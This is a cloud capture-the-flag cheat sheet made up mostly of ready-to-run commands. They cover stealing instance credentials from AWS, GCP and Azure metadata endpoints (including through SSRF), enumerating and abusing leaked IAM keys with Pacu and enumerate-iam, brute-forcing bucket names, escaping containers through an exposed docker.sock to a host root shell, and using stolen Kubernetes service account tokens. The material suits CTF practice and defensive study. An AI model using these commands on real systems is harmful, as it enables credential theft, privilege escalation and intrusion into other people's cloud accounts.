# Cloud CTF Cheatsheet — Speed Edition

*Built around common defaults: AWS CLI, Azure CLI, gcloud CLI, boto3, ScoutSuite/Prowler,
Pacu, enumerate-iam, curl (for metadata endpoint probing). Swap in your actual installed
set once you send it.*

---

```bash
aws --version                        # AWS CLI
az --version                         # Azure CLI
gcloud --version                     # GCP CLI
curl -s http://169.254.169.254/latest/meta-data/    # instant "am I inside a cloud VM" check
```

**Cloud metadata endpoint quick table (the #1 pivot point in cloud CTF challenges):**

| Provider | Endpoint | Notes |
|---|---|---|
| AWS (IMDSv1) | `http://169.254.169.254/latest/meta-data/` | No auth needed unless IMDSv2 enforced |
| AWS (IMDSv2) | Needs a token first: `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds` header | Common hardening you may need to bypass via SSRF that supports PUT |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Requires header `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Requires header `Metadata: true` |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | No auth |
| Alibaba Cloud | `http://100.100.100.200/latest/meta-data/` | No auth |

```bash
# AWS IMDSv2 token dance (needed if IMDSv1 is blocked)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 1. AWS — Credential Discovery & Enumeration

```bash
aws sts get-caller-identity                                   # confirm who these creds actually are
aws configure list                                             # see currently configured creds/profile

# Once you have leaked/pivoted credentials:
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>          # if using temporary/STS creds

aws s3 ls                                                       # buckets you can see
aws s3 ls s3://<bucket-name>/ --recursive                       # contents of a specific bucket
aws s3 cp s3://<bucket-name>/flag.txt .                         # pull a file down directly
aws iam list-users
aws iam get-user
aws iam list-attached-user-policies --user-name <name>
aws lambda list-functions
aws secretsmanager list-secrets
aws ec2 describe-instances
```

**enumerate-iam — brute-force which API calls your leaked creds can actually make:**
```bash
python3 enumerate-iam.py --access-key <key> --secret-key <secret>
```

**Pacu — full AWS exploitation framework (post-enumeration, once you have a foothold):**
```bash
pacu
Pacu > set_keys                        # feed it the leaked creds
Pacu > run iam__enum_permissions        # figure out actual privilege
Pacu > run s3__bucket_finder            # discover buckets you might not know about
```

---

## 2. Public Bucket / Blob Storage Checks (no credentials needed)

```bash
curl -s https://<bucket>.s3.amazonaws.com/                     # AWS S3, public listing check
curl -s https://storage.googleapis.com/<bucket>/                # GCS
curl -s https://<account>.blob.core.windows.net/<container>?restype=container&comp=list   # Azure Blob
```

**Bucket name guessing/bruteforcing (common CTF pattern: guess the name from context clues):**
```bash
for name in company-backups company-prod company-dev company-assets; do
    echo "=== $name ==="
    curl -s -o /dev/null -w "%{http_code}\n" "https://${name}.s3.amazonaws.com/"
done
```

---

## 3. GCP

```bash
gcloud auth list                                                # confirm active account
gcloud config list
gcloud projects list
gcloud iam service-accounts list
gcloud storage buckets list
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"   # get an access token from inside a VM
```

---

## 4. Azure

```bash
az login
az account show
az storage account list
az ad user list
az vm list
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## 5. Docker / Container Escape (common in "cloud" tracks that are really container challenges)

```bash
cat /proc/1/cgroup                     # confirm you're in a container at all
mount | grep docker                     # look for exposed docker.sock or host mounts
ls -la /var/run/docker.sock            # if mounted in, you likely have host-level docker control

# If docker.sock is accessible, spawn a privileged container mounting the host filesystem:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
```

```bash
# Kubernetes-flavored version -- check for an accessible service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
    https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

---

## 6. Common Misconfiguration Checklist

| Finding | What to try |
|---|---|
| Overly permissive IAM policy (`*` resource/action) | You likely have far more access than intended — enumerate everything |
| Public S3/GCS bucket | Just `ls`/`cp` the contents directly, no creds needed |
| SSRF in a web app running in the cloud | Pivot to the metadata endpoint to steal instance credentials |
| Exposed `docker.sock` | Host-level container escape |
| Hardcoded creds in a config file/env var/git history | Check `git log -p`, `.env`, container image layers |
| Overly broad security group / firewall rule | Direct access to a service that should be internal-only |

---

## 7. Quick Reference — CTF Triage Checklist

**Given raw access to a VM/container:**
```
curl the cloud metadata endpoint immediately → grab IAM role credentials if AWS →
aws sts get-caller-identity to confirm → enumerate-iam or Pacu for what you can actually do
```

**Given leaked credentials directly (key file, env var, etc):**
```
aws sts get-caller-identity → aws iam list-attached-user-policies →
if S3 access: aws s3 ls everything → if Lambda/EC2 access: look for more secrets there
```

**SSRF found in a web app hosted on cloud infra:**
```
Point it at the metadata endpoint (169.254.169.254) → extract role name →
extract temporary credentials → use those credentials via aws CLI
```

**"Find the flag in storage" style challenge:**
```
Try public bucket access first (no creds) → if 403, check IAM enumeration path →
check for versioned/deleted objects if the bucket API allows history access
```

---
